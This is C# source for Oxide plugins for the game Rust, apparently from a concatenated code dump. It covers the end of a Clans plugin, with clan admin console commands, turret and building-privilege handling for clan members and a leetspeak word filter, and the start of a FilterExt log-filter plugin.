                cup.authorizedPlayers.Add(new PlayerNameID
                {
                    userid = ulong.Parse(member.Key),
                    username = ""
                });
            }
        }

        private void AutOnBuildingPrivilage<T>(BasePlayer player, Clan clan, Action<T, string> callback)
        {
            List<string> clanMembers = clan.members.Keys.ToList();
            if (clanMembers == null)
                return;
            var playerEntities = GetPlayerEnitityByType<T>(player);
            if (playerEntities == null) return;
            foreach (var clanMember in clanMembers)
            {
                if (clanMember == player.UserIDString) continue;
                foreach (var entity in playerEntities)
                {
                    callback(entity, clanMember);
                }
            }
        }

        private static List<T> GetPlayerEnitityByType<T>(BasePlayer player)
        {
            var entities = UnityEngine.Object.FindObjectsOfType(typeof(T));
            var playerEntities = new List<T>();

            foreach (object entity in entities)
            {
                if (!(entity is BaseEntity)) continue;

                if ((entity as BaseEntity).OwnerID == player.userID)
                {
                    playerEntities.Add((T)entity);
                }
            }

            return playerEntities;
        }


        object OnTurretTarget(AutoTurret turret, BasePlayer player)
        {
            if (player == null || turret == null || turret.OwnerID == 0 || turret.OwnerID == player.userID || turret.IsAuthed(player)) return null;
            var inClan = HasFriend(turret.OwnerID, player.userID);
            if (inClan != null && (bool)inClan)
            {
                bool check = findClanByUser(turret.OwnerID.ToString()).GetPlayerStats(turret.OwnerID.ToString()).TurretAuth;
                if (check) return false;
            }
            return null;
        }

        private bool CheckClans(ulong TurretID, ulong TargetID)
        {
            var result = HasFriend(TurretID, TargetID);
            return result == null ? false : (bool)result;
        }

        string ClanAlready(ulong ownerid)
        {
            var clan = findClanByUser(ownerid.ToString());
            if (clan == null)
            {
                return "404";
            }
            return clan.tag;
        }

        void ScoreRemove(ulong targetclan, ulong acceptclan)
        {
            var clan = findClanByUser(targetclan.ToString());
            if (clan == null)
            {
                return;
            }
            if (clan.ClanPoints < 0) return;
            var clanremovescore = clan.ClanPoints / 2;
            if (clanremovescore <= 0)
            {
                clan.ClanPoints = 0;
                return;
            }
            clan.ClanPoints -= clanremovescore;
            var clanaccept = findClanByUser(acceptclan.ToString());
            if (clanaccept == null)
            {
                return;
            }
            clanaccept.ClanPoints += clanremovescore;
        }

        object ClanCount(ulong owner)
        {
            var clan = findClanByUser(owner.ToString());
            if (clan == null)
            {
                return false;
            }
            if (clan.IsOwner(owner.ToString()) == false)
            {
                return false;
            }
            return clan.members.Count;
        }
        [HookMethod("HasFriend")]
        private object HasFriend(ulong entOwnerID, ulong PlayerUserID)
        {
            var clanOwner = findClanByUser(entOwnerID.ToString());
            if (clanOwner == null) return null;
            var clanFriend = findClanByUser(PlayerUserID.ToString());
            if (clanFriend == null) return null;
            if (clanOwner.tag == clanFriend.tag) return true;
            return false;
        }
        [HookMethod("IsModerator")]
        private object IsModerator(ulong PlayerUserID)
        {
            var clan = findClanByUser(PlayerUserID.ToString());
            if (clan == null) return null;
            if ((setHomeOwner && clan.IsOwner(PlayerUserID.ToString())) || (setHomeModerator && (clan.IsModerator(PlayerUserID.ToString()) || clan.IsCouncil(PlayerUserID.ToString()))) || setHomeMember) return true;
            return false;
        }
        private Int32 UnixTimeStampUTC()
        {
            Int32 unixTimeStamp;
            DateTime currentTime = DateTime.Now;
            DateTime zuluTime = currentTime.ToUniversalTime();
            DateTime unixEpoch = new DateTime(1970, 1, 1);
            unixTimeStamp = (Int32)(zuluTime.Subtract(unixEpoch)).TotalSeconds;
            return unixTimeStamp;
        }
        private static DateTime UnixTimeStampToDateTime(double unixTimeStamp)
        {
            return unixTimeStamp > MaxUnixSeconds ? UnixEpoch.AddMilliseconds(unixTimeStamp) : UnixEpoch.AddSeconds(unixTimeStamp);
        }
        string msg(string key, string id = null) => lang.GetMessage(key, this, id);
        void PrintChat(BasePlayer player, string message)
        {
            SendReply(player, $"<color={colorTextMsg}>" + message + "</color>");
        }
        [ConsoleCommand("clans")]
        void cclans(ConsoleSystem.Arg arg)
        {
            if (arg != null && arg.Connection != null && arg.Connection.player != null && arg.Connection.authLevel >= 1)
            {
                var sb = new StringBuilder();
                sb.AppendLine("clans.list (Lists all clans, their owners and their membercount)");
                sb.AppendLine("clans.listex (Lists all clans, their owners/members and their onlinestatus)");
                sb.AppendLine("clans.show TAG (lists the choosen clan and the members with status)");
                sb.AppendLine("clans.msg TAG message without quotes (Sends a clan message)");
                if (arg.Connection.authLevel >= authLevelRename) sb.AppendLine("clans.rename OLDTAG NEWTAG (rename's a clan)");
                if (arg.Connection.authLevel >= authLevelDelete) sb.AppendLine("clans.delete TAG (delete's a clan)");
                if (arg.Connection.authLevel >= authLevelInvite) sb.AppendLine("clans.playerinvite TAG playername (sends clan invitation to a player)");
                if (arg.Connection.authLevel >= authLevelKick) sb.AppendLine("clans.playerkick TAG playername (kicks a player from a clan)");
                if (arg.Connection.authLevel >= authLevelPromoteDemote)
                {
                    sb.AppendLine("clans.playerpromote TAG playername (promotes a player)");
                    sb.AppendLine("clans.playerdemote TAG playername (demotes a player)");
                }
                SendReply(arg, sb.ToString());
            }
        }
        [ConsoleCommand("clans.cmds")]
        void cclansCommands(ConsoleSystem.Arg arg)
        {
            if (arg.Connection != null && arg.Connection.authLevel < 2) return;
            var sb = new StringBuilder();
            sb.AppendLine("\n>> Clans command overview <<\n");
            sb.AppendLine("clans.list".PadRight(20) + "| Lists all clans, their owners and their membercount");
            sb.AppendLine("clans.listex".PadRight(20) + "| Lists all clans, their owners/members and their onlinestatus");
            sb.AppendLine("clans.show".PadRight(20) + "| lists the choosen clan and the members with status");
            sb.AppendLine("clans.showduplicates".PadRight(20) + "| lists the players which do exist in more than one clan");
            sb.AppendLine("clans.msg".PadRight(20) + "| message without quotes (Sends a clan message)");
            sb.AppendLine("clans.rename".PadRight(20) + "| rename's a clan");
            sb.AppendLine("clans.delete".PadRight(20) + "| delete's a clan");
            sb.AppendLine("clans.changeowner".PadRight(20) + "| changes the owner to another member");
            sb.AppendLine("clans.playerinvite".PadRight(20) + "| sends clan invitation to a player");
            sb.AppendLine("clans.playerjoin".PadRight(20) + "| joins a player into a clan");
            sb.AppendLine("clans.playerkick".PadRight(20) + "| kicks a player from a clan");
            sb.AppendLine("clans.playerpromote".PadRight(20) + "| promotes a player");
            sb.AppendLine("clans.playerdemote".PadRight(20) + "| demotes a player");
            SendReply(arg, sb.ToString());
        }
        [ConsoleCommand("clans.list")]
        void cclansList(ConsoleSystem.Arg arg)
        {
            if (arg.Connection != null && arg.Connection.authLevel < 1) return;
            TextTable textTable = new TextTable();
            textTable.AddColumn("Tag");
            textTable.AddColumn("Owner");
            textTable.AddColumn("SteamID");
            textTable.AddColumn("Count");
            textTable.AddColumn("On");
            foreach (var iclan in clans)
            {
                Clan clan = clans[iclan.Key];
                var owner = this.covalence.Players.FindPlayerById(clan.owner);
                if (owner == null) continue;
                textTable.AddRow(new string[] {
    clan.tag, owner.Name, clan.owner, clan.total.ToString(), clan.online.ToString()
}
                );
            }
            SendReply(arg, "\n>> Current clans <<\n" + textTable.ToString());
        }
        [ConsoleCommand("clans.showduplicates")]
        void cclansDuplicates(ConsoleSystem.Arg arg)
        {
            if (arg.Connection != null && arg.Connection.authLevel < 1) return;
            TextTable textTable = new TextTable();
            textTable.AddColumn("SteamID");
            textTable.AddColumn("Memberships");
            textTable.AddColumn("PlayerName");
            Dictionary<string, List<string>> clanDuplicates = new Dictionary<string, List<string>>();
            foreach (var iclan in clans)
            {
                Clan clan = clans[iclan.Key];
                foreach (var member in clan.members.ToList())
                {
                    if (!clanDuplicates.ContainsKey(member.Key))
                    {
                        clanDuplicates.Add(member.Key, new List<string>());
                        clanDuplicates[member.Key].Add(clan.tag);
                        continue;
                    }
                    else clanDuplicates[member.Key].Add(clan.tag);
                }
            }
            foreach (var clDup in clanDuplicates)
            {
                if (clDup.Value.Count < 2) continue;
                var player = this.covalence.Players.FindPlayerById(clDup.Key);
                if (player == null) continue;
                textTable.AddRow(new string[] {
    clDup.Key, string.Join(" | ", clDup.Value.ToArray()), player.Name
}
                );
            }
            SendReply(arg, "\n>> Current found duplicates <<\n" + textTable.ToString());
        }
        [ConsoleCommand("clans.listex")]
        void cclansListEx(ConsoleSystem.Arg arg)
        {
            if (arg.Connection != null && arg.Connection.authLevel < 1) return;
            TextTable textTable = new TextTable();
            textTable.AddColumn("Tag");
            textTable.AddColumn("Level");
            textTable.AddColumn("Name");
            textTable.AddColumn("SteamID");
            textTable.AddColumn("Status");
            foreach (var iclan in clans)
            {
                Clan clan = clans[iclan.Key];
                foreach (var memberid in clan.members)
                {
                    var member = this.covalence.Players.FindPlayerById(memberid.Key);
                    if (member == null) continue;
                    textTable.AddRow(new string[] {
        clan.tag, clan.PlayerLevel(member.Id), member.Name, member.Id.ToString(), (member.IsConnected ? "Online": "Offline").ToString()
    }
                    );
                }
                textTable.AddRow(new string[] { }
                );
            }
            SendReply(arg, "\n>> Current clans with members <<\n" + textTable.ToString());
        }
        [ConsoleCommand("clans.show")]
        void cclansShow(ConsoleSystem.Arg arg)
        {
            if (arg.Connection != null && arg.Connection.authLevel < 1) return;
            if (arg.Args == null || arg.Args.Length < 1)
            {
                SendReply(arg, "Usage: clans.show TAG");
                return;
            }
            Clan clan;
            if (!TryGetClan(arg.Args[0], out clan))
            {
                SendReply(arg, string.Format(msg("noclanfound"), arg.Args[0]));
                return;
            }
            var sb = new StringBuilder();
            sb.AppendLine($"\n>> Show clan [{clan.tag}] <<");
            sb.AppendLine($"Description: {clan.description}");
            sb.AppendLine($"Time created: {UnixTimeStampToDateTime(clan.created)}");
            sb.AppendLine($"Last updated: {UnixTimeStampToDateTime(clan.updated)}");
            sb.AppendLine($"Member count: {clan.total}");
            TextTable textTable = new TextTable();
            textTable.AddColumn("Level");
            textTable.AddColumn("Name");
            textTable.AddColumn("SteamID");
            textTable.AddColumn("Status");
            sb.AppendLine();
            foreach (var memberid in clan.members)
            {
                var member = this.covalence.Players.FindPlayerById(memberid.Key);
                if (member == null) continue;
                textTable.AddRow(new string[] {
    clan.PlayerLevel(member.Id), member.Name, member.Id.ToString(), (member.IsConnected ? "Online": "Offline").ToString()
}
                );
            }
            sb.AppendLine(textTable.ToString());
            SendReply(arg, sb.ToString());
        }
        [ConsoleCommand("clans.msg")]
        void cclansBroadcast(ConsoleSystem.Arg arg)
        {
            if (arg.Connection != null && arg.Connection.authLevel < 1) return;
            if (arg.Args == null || arg.Args.Length < 2)
            {
                SendReply(arg, "Usage: clans.msg TAG your message without quotes");
                return;
            }
            Clan clan;
            if (!TryGetClan(arg.Args[0], out clan))
            {
                SendReply(arg, string.Format(msg("noclanfound"), arg.Args[0]));
                return;
            }
            string BroadcastBy = consoleName;
            if (arg.Connection != null)
            {
                if (arg.Connection.authLevel == 2) BroadcastBy = "(Admin) " + arg.Connection.username;
                else BroadcastBy = "(Mod) " + arg.Connection.username;
            }
            string Msg = "";
            for (int i = 1;
            i < arg.Args.Length;
            i++) Msg = Msg + " " + arg.Args[i];
            clan.BroadcastChat($"<color={clanServerColor}>{BroadcastBy}</color>: {Msg}");
            SendReply(arg, $"Broadcast to [{clan.tag}]: {Msg}");
        }
        [ConsoleCommand("clans.rename")]
        void cclansRename(ConsoleSystem.Arg arg)
        {
            if (arg.Connection != null && arg.Connection.authLevel < authLevelRename) return;
            if (arg.Args == null || arg.Args.Length < 2)
            {
                SendReply(arg, "Usage: clans.rename OldTag NewTag");
                return;
            }
            Clan clan;
            if (!TryGetClan(arg.Args[0], out clan))
            {
                SendReply(arg, string.Format(msg("noclanfound"), arg.Args[0]));
                return;
            }
            if (tagReExt.IsMatch(arg.Args[1]))
            {
                SendReply(arg, string.Format(msg("hintchars"), allowedSpecialChars));
                return;
            }
            if (arg.Args[1].Length < tagLengthMin || arg.Args[1].Length > tagLengthMax)
            {
                SendReply(arg, string.Format(msg("hintlength"), tagLengthMin, tagLengthMax));
                return;
            }
            if (clans.ContainsKey(arg.Args[1]))
            {
                SendReply(arg, string.Format(msg("tagblocked")));
                return;
            }
            string oldtag = clan.tag;
            clan.tag = arg.Args[1];
            clan.online = 0;
            clans.Add(clan.tag, clan);
            RemoveClan(oldtag);
            setupPlayers(clan.members.Keys.ToList(), false, clan.tag);
            string oldGroup = permGroupPrefix + oldtag;
            string newGroup = permGroupPrefix + clan.tag;
            if (permission.GroupExists(oldGroup))
            {
                foreach (var member in clan.members) if (permission.UserHasGroup(member.Key, oldGroup)) permission.RemoveUserGroup(member.Key, oldGroup);
                permission.RemoveGroup(oldGroup);
            }
            if (usePermGroups && !permission.GroupExists(newGroup)) permission.CreateGroup(newGroup, "Clan " + clan.tag, 0);
            foreach (var member in clan.members) if (usePermGroups && !permission.UserHasGroup(member.Key, newGroup)) permission.AddUserGroup(member.Key, newGroup);
            string RenamedBy = consoleName;
            if (arg.Connection != null) RenamedBy = arg.Connection.username;
            foreach (var ally in clans)
            {
                Clan allyClan = clans[ally.Key];
                if (allyClan.clanAlliances.Contains(oldtag))
                {
                    allyClan.clanAlliances.Remove(oldtag);
                    allyClan.clanAlliances.Add(clan.tag);
                }
                if (allyClan.invitedAllies.Contains(oldtag))
                {
                    allyClan.invitedAllies.Remove(oldtag);
                    allyClan.invitedAllies.Add(clan.tag);
                }
                if (allyClan.pendingInvites.Contains(oldtag))
                {
                    allyClan.pendingInvites.Remove(oldtag);
                    allyClan.pendingInvites.Add(clan.tag);
                }
            }
            clan.BroadcastLoc("clanrenamed", $"<color={clanServerColor}>{RenamedBy}</color>", clan.tag);
            SendReply(arg, string.Format(msg("yourenamed"), oldtag, clan.tag));
            clan.OnUpdate();
        }
        [ConsoleCommand("clans.playerinvite")]
        void cclansPlayerInvite(ConsoleSystem.Arg arg)
        {
            if (arg.Connection != null && arg.Connection.authLevel < authLevelInvite) return;
            if (arg.Args == null || arg.Args.Length < 2)
            {
                SendReply(arg, "Usage: clans.playerinvite TAG playername/id");
                return;
            }
            Clan myClan;
            Clan check;
            if (!TryGetClan(arg.Args[0], out check))
            {
                SendReply(arg, string.Format(msg("noclanfound"), arg.Args[0]));
                return;
            }
            else myClan = (Clan)check;
            var invPlayer = myClan.GetIPlayer(arg.Args[1]);
            if (invPlayer == null)
            {
                SendReply(arg, string.Format(msg("nosuchplayer"), arg.Args[1]));
                return;
            }
            if (myClan.members.ContainsKey(invPlayer.Id))
            {
                SendReply(arg, string.Format(msg("alreadymember"), invPlayer.Name));
                return;
            }
            if (myClan.invites.ContainsKey(invPlayer.Id))
            {
                SendReply(arg, string.Format(msg("alreadyinvited"), invPlayer.Name));
                return;
            }
            if (findClanByUser(invPlayer.Id) != null)
            {
                SendReply(arg, string.Format(msg("alreadyinclan"), invPlayer.Name));
                return;
            }
            myClan.invites.Add(invPlayer.Id, UnixTimeStampUTC());
            if (!pendingPlayerInvites.ContainsKey(invPlayer.Id))
                pendingPlayerInvites.Add(invPlayer.Id, new List<string>());
            pendingPlayerInvites[invPlayer.Id].Add(myClan.tag);
            if (invPlayer.IsConnected)
            {
                var invited = rust.FindPlayerByIdString(invPlayer.Id);
                if (invited != null) PrintChat(invited, string.Format(msg("claninvite", invPlayer.Id), myClan.tag, myClan.description, colorCmdUsage));
            }
            myClan.updated = UnixTimeStampUTC();
            SendReply(arg, $"Invitation for clan '{myClan.tag}' sent to '{invPlayer.Name}'");
        }
        [ConsoleCommand("clans.playerjoin")]
        void cclansPlayerJoin(ConsoleSystem.Arg arg)
        {
            if (arg.Connection != null && arg.Connection.authLevel < authLevelInvite) return;
            if (arg.Args == null || arg.Args.Length < 2)
            {
                SendReply(arg, "Usage: clans.playerjoin TAG playername/id");
                return;
            }
            Clan myClan;
            Clan check;
            if (!TryGetClan(arg.Args[0], out check))
            {
                SendReply(arg, string.Format(msg("noclanfound"), arg.Args[0]));
                return;
            }
            else myClan = (Clan)check;
            var joinPlayer = myClan.GetIPlayer(arg.Args[1]);
            if (joinPlayer == null)
            {
                SendReply(arg, string.Format(msg("nosuchplayer"), arg.Args[1]));
                return;
            }
            if (myClan.members.ContainsKey(joinPlayer.Id))
            {
                SendReply(arg, string.Format(msg("alreadymember"), joinPlayer.Name));
                return;
            }
            if (findClanByUser(joinPlayer.Id) != null)
            {
                SendReply(arg, string.Format(msg("alreadyinclan"), joinPlayer.Name));
                return;
            }
            myClan.invites.Remove(joinPlayer.Id);
            pendingPlayerInvites.Remove(joinPlayer.Id);
            myClan.members.Add(joinPlayer.Id, new PlayerStats());

            clanCache[joinPlayer.Id] = myClan;
            if (joinPlayer.IsConnected)
            {
                var joined = rust.FindPlayerByIdString(joinPlayer.Id);
                SetupPlayer(joined, joinPlayer, false, myClan);
            }
            if (usePermGroups && !permission.UserHasGroup(joinPlayer.Id, permGroupPrefix + myClan.tag)) permission.AddUserGroup(joinPlayer.Id, permGroupPrefix + myClan.tag);
            myClan.BroadcastLoc("playerjoined", myClan.ColNam(joinPlayer.Id, joinPlayer.Name));
            myClan.updated = UnixTimeStampUTC();
            myClan.total++;

            myClan.OnUpdate();
            List<string> others = new List<string>(myClan.members.Keys.ToList());
            others.Remove(joinPlayer.Id);
            Interface.Oxide.CallHook("OnClanMemberJoined", joinPlayer.Id, others);
            SendReply(arg, $"Playerjoin into clan '{myClan.tag}' done for '{joinPlayer.Name}'");
        }
        [ConsoleCommand("clans.playerkick")]
        void cclansPlayerKick(ConsoleSystem.Arg arg)
        {
            if (arg.Connection != null && arg.Connection.authLevel < authLevelKick) return;
            if (arg.Args == null || arg.Args.Length < 2)
            {
                SendReply(arg, "Usage: clans.playerkick TAG playername/id");
                return;
            }
            Clan myClan;
            Clan check;
            if (!TryGetClan(arg.Args[0], out check))
            {
                SendReply(arg, string.Format(msg("noclanfound"), arg.Args[0]));
                return;
            }
            else myClan = (Clan)check;
            var kickPlayer = myClan.GetIMember(arg.Args[1]);
            if (kickPlayer == null)
            {
                SendReply(arg, string.Format(msg("nosuchplayer"), arg.Args[1]));
                return;
            }
            if (!myClan.IsMember(kickPlayer.Id) && !myClan.IsInvited(kickPlayer.Id))
            {
                SendReply(arg, string.Format(msg("notmembercannotkicked"), kickPlayer.Name));
                return;
            }
            if (myClan.members.Count() == 1)
            {
                SendReply(arg, "The clan has only one member. You need to delete the clan");
                return;
            }
            if (myClan.members.ContainsKey(kickPlayer.Id)) myClan.total--;
            myClan.invites.Remove(kickPlayer.Id);
            if (myClan.IsCouncil(kickPlayer.Id)) myClan.council = null;
            myClan.moderators.Remove(kickPlayer.Id);
            myClan.members.Remove(kickPlayer.Id);
            myClan.invites.Remove(kickPlayer.Id);
            bool ownerChanged = false;
            if (myClan.IsOwner(kickPlayer.Id) && myClan.members.Count() > 0)
            {
                myClan.owner = myClan.members.ToList()[0].Key;
                ownerChanged = true;
            }
            if (pendingPlayerInvites.ContainsKey(kickPlayer.Id)) pendingPlayerInvites[kickPlayer.Id].Remove(myClan.tag);
            clanCache.Remove(kickPlayer.Id);
            var kickBasePlayer = rust.FindPlayerByIdString(kickPlayer.Id);
            if (kickBasePlayer != null)
            {
                SetupPlayer(kickBasePlayer, kickPlayer, true, oldTag: myClan.tag);
                RemoveRadar(kickBasePlayer, myClan.tag, true);
            }
            if (usePermGroups && permission.UserHasGroup(kickPlayer.Id, permGroupPrefix + myClan.tag)) permission.RemoveUserGroup(kickPlayer.Id, permGroupPrefix + myClan.tag);
            myClan.updated = UnixTimeStampUTC();
            myClan.OnUpdate();
            Interface.Oxide.CallHook("OnClanMemberGone", kickPlayer.Id, myClan.members);
            SendReply(arg, $"Player '{kickPlayer.Name}' was kicked from clan '{myClan.tag}'");
            if (ownerChanged)
            {
                var newOwner = myClan.GetIPlayer(myClan.owner);
                if (newOwner != null) SendReply(arg, $"New owner of clan '{myClan.tag}' is {newOwner.Name}");
            }
        }
        [ConsoleCommand("clans.changeowner")]
        void cclansChangeOwner(ConsoleSystem.Arg arg)
        {
            if (arg.Connection != null && arg.Connection.authLevel < authLevelPromoteDemote) return;
            if (arg.Args == null || arg.Args.Length < 2)
            {
                SendReply(arg, "Usage: clans.changeowner TAG playername/id");
                return;
            }
            Clan myClan;
            Clan check;
            if (!TryGetClan(arg.Args[0], out check))
            {
                SendReply(arg, string.Format(msg("noclanfound"), arg.Args[0]));
                return;
            }
            else myClan = (Clan)check;
            var promotePlayer = myClan.GetIPlayer(arg.Args[1]);
            if (promotePlayer == null)
            {
                SendReply(arg, string.Format(msg("nosuchplayer"), arg.Args[1]));
                return;
            }
            if (!myClan.IsMember(promotePlayer.Id))
            {
                SendReply(arg, string.Format(msg("notaclanmember"), promotePlayer.Name));
                return;
            }
            if (myClan.IsOwner(promotePlayer.Id))
            {
                SendReply(arg, string.Format(msg("alreadyowner"), promotePlayer.Name));
                return;
            }
            string PromotedBy = consoleName;
            if (arg.Connection != null) PromotedBy = arg.Connection.username;
            if (myClan.council == promotePlayer.Id) myClan.council = null;
            myClan.moderators.Remove(promotePlayer.Id);
            myClan.owner = promotePlayer.Id;
            myClan.BroadcastLoc("playerpromotedowner", $"<color={clanServerColor}>{PromotedBy}</color>", myClan.ColNam(promotePlayer.Id, promotePlayer.Name));
            myClan.updated = UnixTimeStampUTC();
            myClan.OnUpdate();
            SendReply(arg, $"You promoted '{promotePlayer.Name}' to the {myClan.PlayerLevel(promotePlayer.Id.ToString())}");
        }
        [ConsoleCommand("clans.playerpromote")]
        void cclansPlayerPromote(ConsoleSystem.Arg arg)
        {
            if (arg.Connection != null && arg.Connection.authLevel < authLevelPromoteDemote) return;
            if (arg.Args == null || arg.Args.Length < 2)
            {
                SendReply(arg, "Usage: clans.playerpromote TAG playername/id");
                return;
            }
            Clan myClan;
            Clan check;
            if (!TryGetClan(arg.Args[0], out check))
            {
                SendReply(arg, string.Format(msg("noclanfound"), arg.Args[0]));
                return;
            }
            else myClan = (Clan)check;
            var promotePlayer = myClan.GetIPlayer(arg.Args[1]);
            if (promotePlayer == null)
            {
                SendReply(arg, string.Format(msg("nosuchplayer"), arg.Args[1]));
                return;
            }
            if (!myClan.IsMember(promotePlayer.Id))
            {
                SendReply(arg, string.Format(msg("notaclanmember"), promotePlayer.Name));
                return;
            }
            if (enableClanAllies && myClan.IsCouncil(promotePlayer.Id))
            {
                SendReply(arg, string.Format(msg("alreadyacouncil"), promotePlayer.Name));
                return;
            }
            if (enableClanAllies && myClan.council != null && myClan.IsModerator(promotePlayer.Id))
            {
                SendReply(arg, string.Format(msg("alreadyacouncilset"), promotePlayer.Name));
                return;
            }
            if (!enableClanAllies && myClan.IsModerator(promotePlayer.Id))
            {
                SendReply(arg, string.Format(msg("alreadyamod"), promotePlayer.Name));
                return;
            }
            if (!myClan.IsModerator(promotePlayer.Id) && limitModerators >= 0 && myClan.moderators.Count() >= limitModerators)
            {
                SendReply(arg, string.Format(msg("maximummods")));
                return;
            }
            string PromotedBy = consoleName;
            if (arg.Connection != null) PromotedBy = arg.Connection.username;
            if (enableClanAllies && myClan.IsModerator(promotePlayer.Id))
            {
                myClan.council = promotePlayer.Id;
                myClan.moderators.Remove(promotePlayer.Id);
                myClan.BroadcastLoc("playerpromotedcouncil", $"<color={clanServerColor}>{PromotedBy}</color>", myClan.ColNam(promotePlayer.Id, promotePlayer.Name));
            }
            else
            {
                myClan.moderators.Add(promotePlayer.Id);
                myClan.BroadcastLoc("playerpromoted", $"<color={clanServerColor}>{PromotedBy}</color>", myClan.ColNam(promotePlayer.Id, promotePlayer.Name));
            }
            myClan.updated = UnixTimeStampUTC();
            myClan.OnUpdate();
            SendReply(arg, $"You promoted '{promotePlayer.Name}' to a {myClan.PlayerLevel(promotePlayer.Id.ToString())}");
        }
        [ConsoleCommand("clans.playerdemote")]
        void cclansPlayerDemote(ConsoleSystem.Arg arg)
        {
            if (arg.Connection != null && arg.Connection.authLevel < authLevelPromoteDemote) return;
            if (arg.Args == null || arg.Args.Length < 2)
            {
                SendReply(arg, "Usage: clans.playerdemote TAG playername/id");
                return;
            }
            Clan myClan;
            Clan check;
            if (!TryGetClan(arg.Args[0], out check))
            {
                SendReply(arg, string.Format(msg("noclanfound"), arg.Args[0]));
                return;
            }
            else myClan = (Clan)check;
            var demotePlayer = myClan.GetIPlayer(arg.Args[1]);
            if (demotePlayer == null)
            {
                SendReply(arg, string.Format(msg("nosuchplayer"), arg.Args[1]));
                return;
            }
            if (!myClan.IsMember(demotePlayer.Id))
            {
                SendReply(arg, string.Format(msg("notaclanmember"), demotePlayer.Name));
                return;
            }
            if (!myClan.IsModerator(demotePlayer.Id) && !myClan.IsCouncil(demotePlayer.Id))
            {
                SendReply(arg, string.Format(msg("notpromoted"), demotePlayer.Name));
                return;
            }
            string DemotedBy = consoleName;
            if (arg.Connection != null) DemotedBy = arg.Connection.username;
            if (enableClanAllies && myClan.IsCouncil(demotePlayer.Id))
            {
                myClan.council = null;
                if (limitModerators >= 0 && myClan.moderators.Count() >= limitModerators) myClan.BroadcastLoc("playerdemoted", $"<color={clanServerColor}>{DemotedBy}</color>", myClan.ColNam(demotePlayer.Id, demotePlayer.Name));
                else
                {
                    myClan.moderators.Add(demotePlayer.Id);
                    myClan.BroadcastLoc("councildemoted", $"<color={clanServerColor}>{DemotedBy}</color>", myClan.ColNam(demotePlayer.Id, demotePlayer.Name));
                }
            }
            else
            {
                myClan.moderators.Remove(demotePlayer.Id);
                myClan.BroadcastLoc("playerdemoted", $"<color={clanServerColor}>{DemotedBy}</color>", myClan.ColNam(demotePlayer.Id, demotePlayer.Name));
            }
            myClan.updated = UnixTimeStampUTC();
            myClan.OnUpdate();
            SendReply(arg, $"You demoted '{demotePlayer.Name}' to a {myClan.PlayerLevel(demotePlayer.Id.ToString())}");
        }
        [ConsoleCommand("clans.delete")]
        void cclansDelete(ConsoleSystem.Arg arg)
        {
            if (arg.Connection != null && arg.Connection.authLevel < authLevelDelete) return;
            if (arg.Args == null || arg.Args.Length != 1)
            {
                SendReply(arg, "Usage: clans.delete TAG");
                return;
            }
            Clan clan;
            if (!TryGetClan(arg.Args[0], out clan))
            {
                SendReply(arg, string.Format(msg("noclanfound"), arg.Args[0]));
                return;
            }
            string DeletedBy = consoleName;
            RemoveRadarGroup(clan.members.Keys.ToList(), clan.tag, true);
            if (arg.Connection != null) DeletedBy = arg.Connection.username;
            clan.BroadcastLoc("clandeleted", $"<color={clanServerColor}>{DeletedBy}</color>");
            RemoveClan(arg.Args[0]);
            foreach (var member in clan.members) clanCache.Remove(member.Key);
            setupPlayers(clan.members.Keys.ToList(), true, clan.tag);
            string permGroup = permGroupPrefix + clan.tag;
            if (permission.GroupExists(permGroup))
            {
                foreach (var member in clan.members) if (permission.UserHasGroup(member.Key, permGroup)) permission.RemoveUserGroup(member.Key, permGroup);
                permission.RemoveGroup(permGroup);
            }
            foreach (var ally in clans)
            {
                Clan allyClan = clans[ally.Key];
                allyClan.clanAlliances.Remove(arg.Args[0]);
                allyClan.invitedAllies.Remove(arg.Args[0]);
                allyClan.pendingInvites.Remove(arg.Args[0]);
            }
            SendReply(arg, string.Format(msg("youdeleted"), clan.tag));
            clan.OnDestroy();

            Interface.Oxide.CallHook("OnClanDisbanded", clan.members);
            AllyRemovalCheck();
        }
        bool FilterText(string tag)
        {
            foreach (string bannedword in wordFilter) if (TranslateLeet(tag).ToLower().Contains(bannedword.ToLower())) return true;
            return false;
        }
        string TranslateLeet(string original)
        {
            string translated = original;
            Dictionary<string, string> leetTable = new Dictionary<string, string> {
    {
    "}{", "h"
}
, {
    "|-|", "h"
}
, {
    "]-[", "h"
}
, {
    "/-/", "h"
}
, {
    "|{", "k"
}
, {
    "/\\/\\", "m"
}
, {
    "|\\|", "n"
}
, {
    "/\\/", "n"
}
, {
    "()", "o"
}
, {
    "[]", "o"
}
, {
    "vv", "w"
}
, {
    "\\/\\/", "w"
}
, {
    "><", "x"
}
, {
    "2", "z"
}
, {
    "4", "a"
}
, {
    "@", "a"
}
, {
    "8", "b"
}
, {
    "ß", "b"
}
, {
    "(", "c"
}
, {
    "<", "c"
}
, {
    "{", "c"
}
, {
    "3", "e"
}
, {
    "€", "e"
}
, {
    "6", "g"
}
, {
    "9", "g"
}
, {
    "&", "g"
}
, {
    "#", "h"
}
, {
    "$", "s"
}
, {
    "7", "t"
}
, {
    "|", "l"
}
, {
    "1", "i"
}
, {
    "!", "i"
}
, {
    "0", "o"
}
,
};

            foreach (var leet in leetTable) translated = translated.Replace(leet.Key, leet.Value);
            return translated;
        }
        bool TryGetClan(string input, out Clan clan)
        {
            clan = default(Clan);
            Clan tmp = null;
            if (clans.TryGetValue(input, out tmp))
            {
                clan = tmp;
                return true;
            }
            string name;
            if (clansSearch.TryGetValue(input.ToLower(), out name))
            {
                if (clans.TryGetValue(name, out tmp))
                {
                    clan = tmp;
                    return true;
                }
            }
            return false;
        }
        void RemoveClan(string tag)
        {
            clans.Remove(tag);
            clansSearch.Remove(tag.ToLower());
        }
        [HookMethod("EnableBypass")]
        void EnableBypass(object userId)
        {
            if (!enableFFOPtion || userId == null) return;
            if (userId is string) userId = Convert.ToUInt64((string)userId);
            bypass.Add((ulong)userId);
        }
        [HookMethod("DisableBypass")]
        void DisableBypass(object userId)
        {
            if (!enableFFOPtion || userId == null) return;
            if (userId is string) userId = Convert.ToUInt64((string)userId);
            bypass.Remove((ulong)userId);
        }
    }
}

// --- End of file: Clans (10).cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/FilterExt.cs ---
// --- Original Local Path: FilterExt.cs ---

using System.Linq;

using Oxide.Game.Rust;

namespace Oxide.Plugins
{
    [Info("FilterExt", "Wulf/lukespragg", 0.1)]
    [Description("Extension to Oxide's filter for removing unwanted messages.")]

    class FilterExt : RustPlugin
    {
        void Loaded()
        {
            // Get existing filter list
            var filter = RustExtension.Filter.ToList();

            // Add messages to filter
            filter.Add("- deleting");
            filter.Add("ERROR building certificate chain");
            filter.Add("Enforcing SpawnPopulation Limits");
